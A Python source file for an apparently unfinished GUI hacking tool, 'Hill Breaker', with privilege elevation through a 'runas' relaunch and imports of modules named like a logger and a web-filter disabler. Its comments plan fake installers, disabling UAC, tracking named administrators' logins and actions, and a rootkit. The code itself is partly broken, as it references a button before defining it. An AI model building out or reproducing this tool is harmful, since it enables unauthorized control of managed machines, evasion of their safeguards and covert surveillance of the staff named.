import tkinter
from tkinter import ttk, messagebox
import loggermain, Jacker, LightspeedOff
from ctypes import windll
from sys import executable, argv
from os import getlogin

c = (windll.shell32)

def Main():
    root = tkinter.Tk()
    root.geometry('500x700')
    root.title("Hill Breaker")

    #Tabs
    tab = ttk.Notebook(root)

    home = ttk.Frame(tab, padding=10)
    hijacking = ttk.Frame(tab, padding=10)
    controls = ttk.Frame(tab, padding=10)
    
    tab.add(home, text='Home')
    tab.add(hijacking, text='Hijacking')
    tab.add(controls, text='Controls')

    tab.pack(expand=1, fill='both')# I have no idea why I need these args :(

    #Home
    admin = ttk.LabelFrame(home,text="Elevation Status",padding=10)
    status = ttk.Label(admin,text="Program is not currently elevated.").pack(anchor='nw')
    if c.IsUserAnAdmin(): # Can probably do this all with a text variable and returns and blah blah
        status.config(text="Program is running as elevated under " + getlogin()) # Probably better to just not do this in python
        elevate.config(disabled=1)
    admin.pack(anchor='nw')

    elevate = ttk.Button(admin,text="Elevate",command=Elevate).pack(anchor='nw')

    #Hijacker - Create fake installers, etc

    #Controller - Control local system, disable UAC, etc

    #Stalker - "stalk" admins and admin logs, i.e "tdoyle has logged in at __" "cevans has done __"

    #Roots - Rootkit when?

    root.mainloop()

def Elevate():
    c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None) # Creates new program, BUT DOESNT STOP OLD ONE
    if c.IsUserAnAdmin():
        quit() # After new elevated script is running, Keep Yourself Safe #03
    else:
        messagebox.showerror(title='Hill Breaker', message='Failed to elevate program.')
    
if __name__ == "__main__":
    windll.shcore.SetProcessDpiAwareness(1) #Blurry fonts - https://stackoverflow.com/questions/41315873

        
    Main()